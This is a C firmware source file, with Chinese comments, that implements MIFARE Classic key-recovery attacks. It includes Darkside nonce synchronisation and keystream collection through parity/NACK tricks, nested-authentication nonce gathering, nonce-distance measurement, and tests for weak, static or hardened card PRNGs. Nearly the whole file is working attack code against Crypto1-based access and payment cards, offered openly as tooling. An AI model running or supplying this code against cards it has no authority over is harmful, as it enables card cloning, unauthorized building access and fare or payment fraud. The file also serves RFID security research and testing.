#include "parity.h"
#include "bsp_delay.h"
#include "hex_utils.h"

#include "mf1_toolbox.h"
#include "mf1_crapto1.h"
#include "app_status.h"

#include "nrf_log.h"
#include "nrf_log_ctrl.h"
#include "nrf_log_default_backends.h"


// 天线重置的默认延时
static uint32_t g_ant_reset_delay = 8;

// 全局操作使用的标签的信息
static picc_14a_tag_t m_tag_info;
static picc_14a_tag_t *p_tag_info = &m_tag_info;


/**
* @brief 	: 测算随机数的距离值，根据实时算出来的多项式表
*				官方注释：x,y valid tag nonces, then prng_successor(x, nonce_distance(x, y)) = y
* @param 	:msb : 随机数高位，传出结果由此指针完成
* @param 	:lsb : 随机数低位，传出结果由此指针完成
* @retval	: 无
*
*/
void nonce_distance_notable(uint32_t *msb, uint32_t *lsb) {
	uint16_t x = 1, pos;
	uint8_t calc_ok = 0;

	for (uint16_t i = 1; i; ++i) {
		// 计算坐标，以获得多项式的步进运算结果
		pos = (x & 0xff) << 8 | x >> 8;
		// 判断坐标，我们取出对应的值并且设置以取值的标志位
		if ((pos == *msb) & !(calc_ok >> 0 & 0x01)) {
			*msb = i;
			calc_ok |= 0x01;
		}
		if ((pos == *lsb) & !(calc_ok >> 1 & 0x01)) {
			*lsb = i;
			calc_ok |= 0x02;
		}
		// 最终两个值的测算都完成的话，我们直接结束运算，
		// 以减少不必要的后续CPU性能损耗
		if (calc_ok == 0x03) {
			return;
		}
		x = x >> 1 | (x ^ x >> 2 ^ x >> 3 ^ x >> 5) << 15;
	}
}

/**
* @brief 	: 测算PRNG的步进规律，以验证该随机数是否是可预测的
*				假若该可预测，那么就可能支持 Darkside攻击
*				并且可能支持 Nested 攻击
* @param 	:nonce 	: 测量的随机数
* @retval	: 	true = weak prng
*				false = hardend prng
*
*/
bool validate_prng_nonce_notable(uint32_t nonce) {
	// 给出初始的坐标值
	uint32_t msb = nonce >> 16;
	uint32_t lsb = nonce & 0xffff;
	// 传入坐标进行直接运算，并且传出也由传入参数间接传出
	nonce_distance_notable(&msb, &lsb);
    return ((65535 - msb + lsb) % 65535) == 16;
}

/**
* @brief 	: 重置场，在一定的延时之后重启场
*
*/
static inline void ResetRadioFieldWithDelay(void) {
	pcd_14a_reader_antenna_off();
	bsp_delay_ms(g_ant_reset_delay);
	pcd_14a_reader_antenna_on();
}

/**
* @brief 	: 发送mifare指令
* @param 	:pcs 	 : crypto1句柄
* @param 	:crypted : 这批数据是否需要被 crypto1 加密
* @param 	:cmd 	 : 将被发送的指令，例如 0x60 表示验证 A 秘钥
* @param 	:data 	 : 将被发送的数据，例如 0x03 表示验证 1 扇区
* @param 	:answer  : 卡片的应答数据存放的数组
* @param 	:answer_parity  : 卡片的应答数据的奇偶校验位存放的数组
* @retval	: 卡片应答的数据的长度，这个长度是 bit 长度，不是 byte长度
*
*/
uint8_t sendcmd(struct Crypto1State *pcs, uint8_t crypted, uint8_t cmd, uint8_t data, uint8_t *status, uint8_t *answer, uint8_t *answer_parity, uint16_t answer_max_bit) {
	// 这里我们直接设置为静态
	static uint8_t pos;
	static uint16_t len;
    static uint8_t dcmd[4];
    static uint8_t ecmd[4];
	static uint8_t par[4];

	dcmd[0] = ecmd[0] = cmd;
	dcmd[1] = ecmd[1] = data;

    crc_14a_append(dcmd, 2);

    ecmd[2] = dcmd[2];
	ecmd[3] = dcmd[3];

	len = 0;

	if (pcs && crypted) {
		for (pos = 0; pos < 4; pos++) {
			ecmd[pos] = crypto1_byte(pcs, 0x00, 0) ^ dcmd[pos];
			par[pos] = filter(pcs->odd) ^ oddparity8(dcmd[pos]);
		}
		*status = pcd_14a_reader_bits_transfer(
			ecmd,
			32,
			par,
			answer,
			answer_parity,
			&len,
			answer_max_bit
		);
    } else {
		*status = pcd_14a_reader_bytes_transfer(
			PCD_TRANSCEIVE,
			dcmd,
			4,
			answer,
			&len,
			answer_max_bit
		);
    }

	// 通信有问题，不继续接下来的任务
	if (*status != HF_TAG_OK) {
		return len;
	}

    if (crypted == CRYPT_ALL) {
        if (len == 8) {
            uint16_t res = 0;
            res |= (crypto1_bit(pcs, 0, 0) ^ BIT(answer[0], 0)) << 0;
            res |= (crypto1_bit(pcs, 0, 0) ^ BIT(answer[0], 1)) << 1;
            res |= (crypto1_bit(pcs, 0, 0) ^ BIT(answer[0], 2)) << 2;
            res |= (crypto1_bit(pcs, 0, 0) ^ BIT(answer[0], 3)) << 3;
            answer[0] = res;
        } else {
            for (pos = 0; pos < len % 8; pos++)
                answer[pos] = crypto1_byte(pcs, 0x00, 0) ^ answer[pos];
        }
    }

    return len;
}

/**
* @brief 	: 高级验证过程
* @param 	:pcs 	  : crypto1句柄
* @param 	:uid 	  : 卡片的UID号
* @param 	:blockNo  : 验证的块号
* @param 	:keyType  : 秘钥类型, 0x60(A秘钥) 或者 0x61(B秘钥)
* @param 	:ui64Key  : 卡片的秘钥的U64值
* @param 	:isNested : 当前是否是嵌套验证
* @param 	:ntptr	  : 存放NT的地址，如果传入 NULL ，则不保存NT
* @retval	: 验证成功返回 0 ，验证不成功返回非 0 值
*
*/
int authex(struct Crypto1State *pcs, uint32_t uid, uint8_t blockNo, uint8_t keyType, uint64_t ui64Key, uint8_t isNested, uint32_t *ntptr) {
    static uint8_t status;  									// tag resonse status
	static uint16_t len;										// tag resonse length
    static uint32_t pos, nt, ntpp; 								// Supplied tag nonce
    static const uint8_t nr[] 	= { 0x12, 0x34, 0x56, 0x78 };	// 使用固定的卡片随机数 NR，也就是Nonce Reader。
	uint8_t par[] 				= { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    uint8_t mf_nr_ar[]			= { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    uint8_t answer[] 			= { 0x00, 0x00, 0x00, 0x00 };
    uint8_t parity[] 			= { 0x00, 0x00, 0x00, 0x00 };

	len = sendcmd(pcs, isNested, keyType, blockNo, &status, answer, parity, U8ARR_BIT_LEN(answer));
	if (len != 32) {
		NRF_LOG_INFO("No 32 data recv on sendcmd: %d\r\n", len);
		return HF_ERRSTAT;
	}

    // Save the tag nonce (nt)
    nt = BYTES4_TO_U32(answer);

    //  ----------------------------- crypto1 create
    if (isNested) {
		crypto1_deinit(pcs);
	}

    // Init cipher with key
    crypto1_init(pcs, ui64Key);

    if (isNested == AUTH_NESTED) {
        // decrypt nt with help of new key
        nt = crypto1_word(pcs, nt ^ uid, 1) ^ nt;
    } else {
        // Load (plain) uid^nt into the cipher
        crypto1_word(pcs, nt ^ uid, 0);
    }

    // save Nt
    if (ntptr)
        *ntptr = nt;

    // Generate (encrypted) nr+parity by loading it into the cipher (Nr)
    for (pos = 0; pos < 4; pos++) {
        mf_nr_ar[pos] = crypto1_byte(pcs, nr[pos], 0) ^ nr[pos];
		par[pos] = filter(pcs->odd) ^ oddparity8(nr[pos]);
    }

    // Skip 32 bits in pseudo random generator
    nt = prng_successor(nt, 32);

    // ar+parity
    for (pos = 4; pos < 8; pos++) {
        nt = prng_successor(nt, 8);
        mf_nr_ar[pos] = crypto1_byte(pcs, 0x00, 0) ^ (nt & 0xff);
		par[pos] = filter(pcs->odd) ^ oddparity8(nt);
    }

	// 我们不需要status，因为正常的通信会返回 32bit 的数据
	pcd_14a_reader_bits_transfer(mf_nr_ar, 64, par, answer, parity, &len, U8ARR_BIT_LEN(answer));
	if (len == 32) {
		ntpp = prng_successor(nt, 32) ^ crypto1_word(pcs, 0, 0);
		if (ntpp == BYTES4_TO_U32(answer)) {
			// 验证成功！
			return HF_TAG_OK;
		} else {
			// 失败
			return MF_ERRAUTH;
		}
	}

	// 失败！
    return MF_ERRAUTH;
}

/**
* @brief 	: 选定出现几率最大的一个NT
* @param 	:tag     	  	 : 标签信息结构体，快速选卡需要使用此结构体
* @param 	:block 	  	 	 : 将被攻击的密钥块
* @param 	:keytype 	  	 : 将被攻击的密钥类型
* @param 	:nt 	  	 	 : 最终选定的NT，这个NT是出现次数最多，且排名最靠前的
* @retval 最终确定下来的NT值， 如果无法同步卡片时钟，返回对应的异常码，否则返回 HF_TAG_OK
* -------------------
* 为何无法固定随机数？
*	0、卡片天线位置有自由或者非自由移动的偏差导致通信不稳定。
*	1、所处电磁环境非常复杂，导致卡片上电充能到完成通信的过程无法稳定重放
*	2、卡片针对重放攻击做了漏洞修复，卡片不再被重放攻击套取相同应答
*	3、此代码所运行的环境非裸机或中断太频繁，或其他任务调度太频繁，
*		导致 CPU 无法在稳定的相同的时间内完成重放攻击。
*		此种情况基本无解，建议将此段代码之外的非关键中断以及任务调度关闭
*/
uint8_t Darkside_Select_Nonces(picc_14a_tag_t *tag, uint8_t block, uint8_t keytype, uint32_t *nt) {
#define NT_COUNT 15
	uint8_t tag_auth[4]     	= { keytype, block, 0x00, 0x00 };
	uint8_t tag_resp[4] 		= { 0x00 };
	uint8_t nt_count[NT_COUNT] 	= { 0x00 };
	uint32_t nt_list[NT_COUNT] 	= { 0x00 };
	uint8_t i, m, max, status;
	uint16_t len;

	crc_14a_append(tag_auth, 2);

	// 进行随机数采集
	for(i = 0; i < NT_COUNT; i++) {
		// 在进行天线重置时，我们必须要确保
		// 1、天线断电足够久，以此确保卡片完全断电，否则无法重置卡片的伪随机数生成器
		// 2、断电时间适中，不要太长，会影响效率，也不要太短，会无法无法重置卡片
		ResetRadioFieldWithDelay();
		// 完全断电后，我们进行快速选卡，尽可能的将验证耗时压缩
		if (pcd_14a_reader_scan_auto(tag) != HF_TAG_OK) {
			NRF_LOG_INFO("Tag can't select!\n");
			return HF_TAG_NO;
		}
		status = pcd_14a_reader_bytes_transfer(PCD_TRANSCEIVE, tag_auth, 4, tag_resp, &len, U8ARR_BIT_LEN(tag_resp));
		// 在寻找到卡片后，开始采集随机数
		if (status != HF_TAG_OK || len != 32) {
			NRF_LOG_INFO("Get nt failed.\n");
			return HF_ERRSTAT;
		}
		// 转换为u32的类型，并且进行缓存
		nt_list[i] = bytes_to_num(tag_resp, 4);
		// 转换应答的字节数组为10进制的NT
		// NRF_LOG_INFO("Get nt: %"PRIu32"\r\n", nt_list[i]);
	}

	// 对随机数进行取重
	for(i = 0; i < NT_COUNT; i++) {
		uint32_t nt_a = nt_list[i];
		for(m = i + 1; m < NT_COUNT; m++) {
			uint32_t nt_b = nt_list[m];
			if (nt_a == nt_b) {
				nt_count[i] += 1;
			}
		}
	}

	// 对取重后的最大次数值进行取值
	max = nt_count[0];
	m = 0;
	for(i = 1; i < NT_COUNT; i++) {
		if(nt_count[i] > max) {
			max = nt_count[i];
			m = i;
		}
	}

	// 最终，我们判定一下max次数是否大于0，
	// 如果不大于0，说明无法同步时钟。
	if(max == 0) {
		NRF_LOG_INFO("Can't sync nt.\n");
		return DARKSIDE_CANT_FIXED_NT;
	}

	// NT 固定成功，我们取出出现次数最高的那个
	// NRF_LOG_INFO("Sync nt: %"PRIu32", max = %d\n", nt_list[m], max);
	if (nt) *nt = nt_list[m];  // 只有调用者需要获得NT时才传出
	return HF_TAG_OK;
}

/**
* @brief 	: 使用Darkside漏洞破解一个未知的密钥
* @param 	:dc	: darkside破解的核心应答
* @param 	:dp	: darkside破解的核心参数
* @retval	: 收集成功返回 HF_TAG_OK ，验证不成功返回对应的异常码
*
*/
uint8_t Darkside_Recover_Key(uint8_t targetBlk, uint8_t targetTyp,
	uint8_t firstRecover, uint8_t ntSyncMax, DarksideCore* dc) {

	// 被固定使用的卡片信息
	static uint32_t uid_ori 				= 0;
	uint32_t uid_cur						= 0;

	// 被固定随机数和每次获得的随机数
	static uint32_t nt_ori					= 0;
	uint32_t nt_cur							= 0;

	// mr_nr 生成时每次的变化量
	static uint8_t par_low 					= 0;
	static uint8_t mf_nr_ar3 				= 0;

	// 卡片交互通信							哇塞，好整齐的变量定义
	uint8_t tag_auth[4]    					= { targetTyp, targetBlk, 0x00, 0x00 };
	uint8_t par_list[8]   					= { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
	uint8_t ks_list[8]    					= { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
	uint8_t mf_nr_ar[8]    					= { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

	// 真正通信的时候，全程8个byte的长度足够容纳所有的数据
	uint8_t par_byte[8]    					= { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
	uint8_t dat_recv[8] 					= { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

	// 控制变量
	uint8_t resync_count					= 0x00;  // 这个变量负责统计当前同步时钟以同步NT的尝试次数
	uint8_t received_nack					= 0x00;  // 这个变量负责标志当前是否接收到了NACK的回复
	uint8_t par    							= 0x00;  // 这个变量负责奇偶校验位的递增，以碰撞卡片的回复
	uint8_t status 							= 0x00;  // 这个变量负责保存卡片通信的状态
	uint16_t len 							= 0x00;  // 这个变量负责保存通信过程中卡片的数据应答长度
	uint8_t nt_diff 						= 0x00;  // 这个变量很关键哦，别不初始化，因为下面直接使用了

	// 我们需要先确认使用某一张卡
	if (pcd_14a_reader_scan_auto(p_tag_info) == HF_TAG_OK) {
		uid_cur = get_u32_tag_uid(p_tag_info);
	} else {
		return HF_TAG_NO;
	}

	// 验证指令需要追加CRC16
	crc_14a_append(tag_auth, 2);

	// 初始化静态变量如果是第一次发起攻击
	if (firstRecover) {
		// 重置关键变量
		nt_ori 		= 0;
		mf_nr_ar3 	= 0;
		par_low 	= 0;

		// 第一次运行的话，我们需要固定使用一个卡片
		uid_ori = get_u32_tag_uid(p_tag_info);

		// 然后还需要固定一个大概率出现的随机数
		status = Darkside_Select_Nonces(p_tag_info, targetBlk, targetTyp, &nt_ori);
		if (status != HF_TAG_OK) {
			// 固定随机数失败，无法进行下一步操作
			return status;
		}
	} else {
		// we were unsuccessful on a previous call.
		// Try another READER nonce (first 3 parity bits remain the same)
		mf_nr_ar3++;
		mf_nr_ar[3] = mf_nr_ar3;
		par = par_low;

		if (uid_ori != uid_cur) {
			return DARKSIDE_TAG_CHANGED;
		}
	}

	// 在一个大循环里面一直采集不同的nr ar下的nack
	do {
		// 重置nack的接收标志
		received_nack = 0;

		// 在进行天线重置时，我们必须要确保
		// 1、天线断电足够久，以此确保卡片完全断电，否则无法重置卡片的伪随机数生成器
		// 2、断电时间适中，不要太长，会影响效率，也不要太短，会无法无法重置卡片
		ResetRadioFieldWithDelay();

		// 完全断电后，我们进行快速选卡，尽可能的将验证耗时压缩
		if (pcd_14a_reader_scan_auto(p_tag_info) != HF_TAG_OK) {
			NRF_LOG_INFO("Tag can't select!\n");
			return HF_TAG_NO;
		}

		status = pcd_14a_reader_bytes_transfer(PCD_TRANSCEIVE, tag_auth, 4, dat_recv, &len, U8ARR_BIT_LEN(dat_recv));

		// 在寻找到卡片后，开始采集随机数
		if (status != HF_TAG_OK || len != 32) {
			NRF_LOG_INFO("Get nt failed.\n");
			return HF_ERRSTAT;
		}

		// 转换应答的字节数组为10进制的 NT
		nt_cur = bytes_to_num(dat_recv, 4);
		// NRF_LOG_INFO("Get nt: %"PRIu32"\r\n", nt_cur);

		// 判断时钟同步（使NT固定）
		if (nt_cur != nt_ori) {
			// 随机数不同步，但是我们已经选择过随机数了
			// 并且我们选择的随机数也被成功的重放攻击了
			// 也就说，这种误差，已经没机会修正随机数了
			if (++resync_count == ntSyncMax) {
				NRF_LOG_INFO("Can't fix nonce.\r\n");
				return DARKSIDE_CANT_FIXED_NT;
			}

			// 时钟不同步的情况下，下面的操作是没意义的
			// 因此直接跳过下面的操作，进入下一轮循环，
			// 上帝保佑下一轮循环能同步时钟。。。
			// NRF_LOG_INFO("Sync nt -> nt_fix: %"PRIu32", nt_new: %"PRIu32"\r\n", nt_ori, nt_cur);
			continue;
		}

		// 本来我们只需要发 par 的，利用其中的每一个Bit当做校验位来的
		// 但是奈何我们实现的发送函数只支持以一个uint8_t，也就是一个字节当做一个bit来用
		// 因此此处我们需要把 PM3 的通信写法换成我们的。
		// 这里反正次数不多，我们直接展开换算的代码
		par_byte[0] = par >> 0 & 0x1;
		par_byte[1] = par >> 1 & 0x1;
		par_byte[2] = par >> 2 & 0x1;
		par_byte[3] = par >> 3 & 0x1;
		par_byte[4] = par >> 4 & 0x1;
		par_byte[5] = par >> 5 & 0x1;
		par_byte[6] = par >> 6 & 0x1;
		par_byte[7] = par >> 7 & 0x1;

		len = 0;
		pcd_14a_reader_bits_transfer(mf_nr_ar, 64, par_byte, dat_recv, par_byte, &len, U8ARR_BIT_LEN(dat_recv));

		// 重置固定随机数上限计数
		resync_count = 0;

		if (len == 4) {
			// NRF_LOG_INFO("NACK get: 0x%x\r\n", receivedAnswer[0]);
			received_nack = 1;
		} else if (len == 32) {
			// did we get lucky and got our dummykey to be valid?
			// however we dont feed key w uid it the prng..
			NRF_LOG_INFO("Auth Ok, you are so lucky!\n");
			return DARKSIDE_LUCK_AUTH_OK;
		}

		// Receive answer. This will be a 4 Bit NACK when the 8 parity bits are OK after decoding
		if (received_nack) {
			if (nt_diff == 0) {
				// there is no need to check all parities for other nt_diff. Parity Bits for mf_nr_ar[0..2] won't change
				par_low = par & 0xE0;
			}

			par_list[nt_diff] = (par * 0x0202020202ULL & 0x010884422010ULL) % 1023;
			ks_list[nt_diff] = dat_recv[0] ^ 0x05;  // xor with NACK value to get keystream

			// Test if the information is complete
			if (nt_diff == 0x07) {
				break;
			}

			nt_diff = (nt_diff + 1) & 0x07;
			mf_nr_ar[3] = (mf_nr_ar[3] & 0x1F) | (nt_diff << 5);
			par = par_low;
		} else {
			// No NACK.
			if (nt_diff == 0) {
				par++;
				if (par == 0) {    // tried all 256 possible parities without success. Card doesn't send NACK.
					NRF_LOG_INFO("Card doesn't send NACK.\r\n");
					return DARKSIDE_NACK_NO_SEND;
				}
			} else {
				// Why this?
				par = ((par & 0x1F) + 1) | par_low;
			}
		}
	} while(1);

	mf_nr_ar[3] &= 0x1F;

	// 没有出现意外情况，本次执行判定为成功！
	// 我们需要对结果进行封装返回

	get_4byte_tag_uid(p_tag_info, dc->uid);
    num_to_bytes(nt_cur, 4, dc->nt);
    memcpy(dc->par_list, par_list, sizeof(dc->par_list));
    memcpy(dc->ks_list, ks_list, sizeof(dc->ks_list));
    memcpy(dc->nr, mf_nr_ar, sizeof(dc->nr));
    memcpy(dc->ar, mf_nr_ar + 4, sizeof(dc->ar));

	// NRF_LOG_INFO("Darkside done!\n");
	return HF_TAG_OK;
}

/**
* @brief 	: 修改天线重启的中间延时
*				延时越长，越能重启某些非标卡片，
*				延时越短，越块处理天线重启过程，进而处理后续业务
* @param 	:delay_ms	: 延时的具体值，单位为毫秒
* @retval	: 无
*
*/
void Atenna_Switch_Delay(uint32_t delay_ms) {
	g_ant_reset_delay = delay_ms;
}

/**
* @brief 	: 判断此卡片是否支持Darkside攻击
* @retval	: 如果支持，返回 HF_TAG_OK，如果不支持，
*				返回检测过程中发生异常的结果码：
*					1、DARKSIDE_CANT_FIXED_NT
*					2、DARKSIDE_NACK_NO_SEND
*					3、DARKSIDE_TAG_CHANGED
*				或者其他的卡片相关的通信错误，最常见的是丢失卡片 HF_TAG_NO
*
*/
uint8_t Check_Darkside_Support() {
	// 实例化参数
	DarksideCore dc;
	// 直接判断并且返回结果
	return Darkside_Recover_Key(0x03, PICC_AUTHENT1A, true, 0x15, &dc);
}

/**
* @brief 	: 判断此卡片是否支持M1的验证步骤
* @retval	: 如果支持，将返回HF_TAG_OK，
*				如果不支持，则返回对应的错误码
*
*/
uint8_t Check_Tag_Response_NT(picc_14a_tag_t *tag, uint32_t *nt) {
	struct Crypto1State mpcs 			= { 0, 0 };
	struct Crypto1State *pcs 			= &mpcs;
	uint8_t par_recv[4]					= { 0x00 };
	uint8_t dat_recv[4]					= { 0x00 };
	uint8_t status;

	// 重置卡片通信
	pcd_14a_reader_halt_tag();

	// 我们进行快速选卡，尽可能的将验证耗时压缩
	if (pcd_14a_reader_scan_auto(tag) != HF_TAG_OK) {
		NRF_LOG_INFO("Tag can't select\r\n");
		return HF_TAG_NO;
	}

	// 发送指令并且获取NT返回
	*nt = sendcmd(pcs, AUTH_FIRST, PICC_AUTHENT1A, 0x03, &status, dat_recv, par_recv, U8ARR_BIT_LEN(dat_recv));
	if (*nt != 32) {
		// dbg_block_printf("No 32 data recv on sendcmd: %d\n", *nt);
		return HF_ERRSTAT;
	}
	*nt = bytes_to_num(dat_recv, 4);
	return HF_TAG_OK;
}

/**
* @brief 	: 判断此卡片是否支持标签MF三次验证协议
* @retval	: 如果支持，返回 HF_TAG_OK，如果不支持，
*				则返回 HF_ERRSTAT
*				或者其他的卡片相关的通信错误，最常见的是
*				丢失卡片 HF_TAG_NO 和错误的状态 HF_ERRSTAT
*
*/
uint8_t Check_STDMifareNT_Support() {
	uint32_t nt1 = 0;

	// 寻卡，场内搜索
	if (pcd_14a_reader_scan_auto(p_tag_info) != HF_TAG_OK) {
		return HF_TAG_NO;
	}

	// 获取NT
	return Check_Tag_Response_NT(p_tag_info, &nt1);
}

/**
* @brief 	: 判断此卡片是否支持StaticNested攻击
* @retval	: 如果支持，返回 NESTED_TAG_IS_STATIC，如果不支持，
*				则返回 HF_TAG_OK
*				或者其他的卡片相关的通信错误，最常见的是丢失卡片 HF_TAG_NO
*
*/
uint8_t Check_StaticNested_Support() {
	uint32_t nt1, nt2;
	uint8_t status;

	// 寻卡，场内搜索
	if (pcd_14a_reader_scan_auto(p_tag_info) != HF_TAG_OK) {
		return HF_TAG_NO;
	}

	// 第一波获取NT
	status = Check_Tag_Response_NT(p_tag_info, &nt1);
	if (status != HF_TAG_OK) {
		return status;
	}

	// 获取完成后谨记重置场
	// 如果不重置场的话，某些卡会在场内维持功能时一直提供一个静态的NT
	// 因此此处的重置非常重要。
	ResetRadioFieldWithDelay();

	// 第二波获取NT
	status = Check_Tag_Response_NT(p_tag_info, &nt2);
	if (status != HF_TAG_OK) {
		return status;
	}

	// 检测随机数是否是静态的
	if (nt1 == nt2) {
		return NESTED_TAG_IS_STATIC;
	}

	return HF_TAG_OK;
}

/**
* @brief 	: 判断此卡片是否支持最普通，最弱，最容易的prng攻击
* @retval	: 判断结果
*
*/
uint8_t Check_WeakNested_Support() {
	uint8_t status;
	uint32_t nt1;

	status = Check_StaticNested_Support();

	// 如果判断的过程中，发现并不能完成staticnested的检测
	// 那就直接返回状态，不需要进行下面的判断逻辑了。
	if (status != HF_TAG_OK) {
		return status;
	}

	// 非static的卡片，还可以继续往下跑逻辑
	// ------------------------------------

	// 每次重新操作前，都尝试休眠标签
	// 以重置其可能有问题的状态机
	pcd_14a_reader_halt_tag();

	// 进行寻卡操作
	if (pcd_14a_reader_scan_auto(p_tag_info) != HF_TAG_OK) {
		return HF_TAG_NO;
	}

	// 获取NT，只需要获取一次
	status = Check_Tag_Response_NT(p_tag_info, &nt1);
	if (status != HF_TAG_OK) {
		return status;
	}

	// 测算NT的有效性
	if (validate_prng_nonce_notable(nt1)) {
		// NRF_LOG_INFO("The tag support Nested\n");
		return HF_TAG_OK;
	}
	// NRF_LOG_INFO("The tag support HardNested\n");
	// NT不可预测，无效。

	// ------------------------------------
	// end

	return NESTED_TAG_IS_HARD;
}

/**
* @brief 	: 计算两个随机数的距离
* @param 	:from 	: 从哪个随机数开始
* @param 	:to 	: 到哪个随机数结束
* @retval	: 距离值
*
*/
uint32_t measure_nonces(uint32_t from, uint32_t to)
{
	// 给出初始的坐标值
	uint32_t msb = from >> 16;
	uint32_t lsb = to >> 16;
	// 传入坐标进行直接运算，并且传出也由传入参数间接传出
	nonce_distance_notable(&msb, &lsb);
	return (65535 + lsb - msb) % 65535;
}

/**
* @brief 	: 中间值测量
* @param 	:src 	: 测量源
* @param 	:length : 测量源的个数
* @retval	: 中间值
*
*/
uint32_t measure_medin(uint32_t *src, uint32_t length) {
	uint32_t len = length;
	uint32_t minIndex;
	uint32_t temp, i;

	if (length == 1) {
		return src[0];
	}

	for (i = 0;i < len;i++) {
		// i是已排列的序列的末尾
		minIndex = i;
		for (int j = i + 1;j < len;j++) {
			if (src[j] < src[minIndex]) {
				minIndex = j;
			}
		}
		if (minIndex != i) {
			temp = src[i];
			src[i] = src[minIndex];
			src[minIndex] = temp;
		}
	}
	return src[length / 2 - 1];
}

/**
* @brief 	: 进行Nested攻击前要测量距离，如果距离合适，则可以快速破解
* @param 	:u64Key  : 卡片的秘钥的U64值
* @param 	:block	  : 验证的块号
* @param 	:type  	  : 秘钥类型, 0x60(A秘钥) 或者 0x61(B秘钥)
* @param 	:distance : 最终的距离
* @retval	: 操作结果
*
*/
uint8_t Measure_Distance(uint64_t u64Key, uint8_t block, uint8_t type, uint32_t *distance) {
    struct Crypto1State mpcs = {0, 0};
	struct Crypto1State *pcs = &mpcs;
	uint32_t distances[DIST_NR] = { 0x00 };
	uint32_t uid = get_u32_tag_uid(p_tag_info);
    uint32_t nt1, nt2;
	uint8_t index = 0;

	do {
		// 重置卡片通信
		pcd_14a_reader_halt_tag();
		// 我们进行快速选卡，尽可能的将验证耗时压缩
		if (pcd_14a_reader_scan_auto(p_tag_info) != HF_TAG_OK) {
			NRF_LOG_INFO("Tag can't select\r\n");
			return HF_TAG_NO;
		}
		// 进行第一次验证，以便获取未经加密的NT1
		if(authex(pcs, uid, block, type, u64Key, AUTH_FIRST, &nt1) != HF_TAG_OK) {
			NRF_LOG_INFO("Auth failed 1\r\n");
			return MF_ERRAUTH;
		}
		// 进行嵌套验证，以便获取经过加密的NT2_ENC
		if(authex(pcs, uid, block, type, u64Key, AUTH_NESTED, &nt2) != HF_TAG_OK) {
			NRF_LOG_INFO("Auth failed 2\r\n");
			return MF_ERRAUTH;
		}
		// 判断两个随机数是否是相同的，正常情况下，
		// 我们不可能的带相同的随机数，因为PRNG是随时在更新chip的
		// 如果确实遇到了相同的NT，那么只能说明，这张卡是特殊固件的ST卡
		if (nt1 == nt2) {
			NRF_LOG_INFO("StaticNested: %08x vs %08x\n", nt1, nt2);
			return NESTED_TAG_IS_STATIC;
		}
		// 测量完成之后存放到buffer中
		distances[index++] = measure_nonces(nt1, nt2);
		// dbg_block_printf("dist = %"PRIu32"\n\n", distances[index - 1]);
	} while(index < DIST_NR);

	// 最终计算两个NT的距离并且直接传出
	*distance =  measure_medin(distances, DIST_NR);
	// 需要返回OK值，以标志任务成功
	return HF_TAG_OK;
}

/**
* @brief 	: Nested核心，用于收集随机数，此函数只负责收集，不负责转换与解析为KS
* @param 	:pnc 	  	 : nested 核心结构体，保存相关的通信数据
* @param 	:keyKnown 	 : 卡片的已知秘钥的U64值
* @param 	:blkKnown 	 : 卡片的已知秘钥的所属扇区
* @param 	:typKnown 	 : 卡片的已知秘钥的类型, 0x60(A秘钥) 或者 0x61(B秘钥)
* @param 	:targetBlock : 需要nested攻击的目标扇区
* @param 	:targetType	 : 需要nested攻击的目标秘钥类型
* @retval	: 成功返回 HF_TAG_OK ，验证不成功返回非 HF_TAG_OK 值
*
*/
uint8_t Nested_Recover_Core(NestedCore *pnc, uint64_t keyKnown, uint8_t blkKnown, uint8_t typKnown, uint8_t targetBlock, uint8_t targetType) {
    struct Crypto1State mpcs = {0, 0};
	struct Crypto1State *pcs = &mpcs;
	uint8_t status;
	uint8_t parity[4] = {0x00};
	uint8_t answer[4] = {0x00};
	uint32_t uid, nt1;
	// 转换UID为U32类型，后面用得上
	uid = get_u32_tag_uid(p_tag_info);
	// 重置卡片通信
	pcd_14a_reader_halt_tag();
	// 快速选卡，以便完成验证步骤收集NT1和NT2_ENC
	if (pcd_14a_reader_scan_auto(p_tag_info) != HF_TAG_OK) {
		return HF_TAG_NO;
	}
	// 第一步验证，基础验证不需要嵌套加密
	if(authex(pcs, uid, blkKnown, typKnown, keyKnown, AUTH_FIRST, &nt1) != HF_TAG_OK) {
		return MF_ERRAUTH;
	}
	// 然后就是嵌套验证
	if (sendcmd(pcs, AUTH_NESTED, targetType, targetBlock, &status, answer, parity, U8ARR_BIT_LEN(answer)) != 32) {
		return HF_ERRSTAT;
	};
	// 第一次验证的明文随机数
	num_to_bytes(nt1, 4, pnc->nt1);
	// 嵌套验证的被目标扇区的密码加密的随机数
	memcpy(pnc->nt2, answer, 4);
	// 保存3个bit的奇偶校验位
	pnc->par = 0;
	pnc->par |= ((oddparity8(answer[0]) != parity[0]) << 0);
	pnc->par |= ((oddparity8(answer[1]) != parity[1]) << 1);
	pnc->par |= ((oddparity8(answer[2]) != parity[2]) << 2);
	return HF_TAG_OK;
}

/**
* @brief 	: Nested默认实现，用于收集 SETS_NR 组随机数，此函数只负责收集，不负责转换与解析为KS
* @param 	:ncs 	  	 : nested 核心结构体数组，保存相关的通信数据
* @param 	:keyKnown 	 : 卡片的已知秘钥的U64值
* @param 	:blkKnown 	 : 卡片的已知秘钥的所属扇区
* @param 	:typKnown 	 : 卡片的已知秘钥的类型, 0x60(A秘钥) 或者 0x61(B秘钥)
* @param 	:targetBlock : 需要nested攻击的目标扇区
* @param 	:targetType	 : 需要nested攻击的目标秘钥类型
* @retval	: 攻击返回 HF_TAG_OK ，攻击不成功返回非 HF_TAG_OK 值
*
*/
uint8_t Nested_Recover_Key(uint64_t keyKnown, uint8_t blkKnown, uint8_t typKnown, uint8_t targetBlock, uint8_t targetType, NestedCore ncs[SETS_NR]) {
	uint8_t m, res;
	// 先寻卡，所有的操作都要基于有卡的情况
	res = pcd_14a_reader_scan_auto(p_tag_info);
	if (res!= HF_TAG_OK) {
		return res;
	}
	// 然后采集指定个数的随机数组
	for (m = 0; m < SETS_NR; m++) {
		res = Nested_Recover_Core(
			&(ncs[m]),
			keyKnown,
			blkKnown,
			typKnown,
			targetBlock,
			targetType
		);
		if (res != HF_TAG_OK) {
			return res;
		}
	}
	return HF_TAG_OK;
}

/**
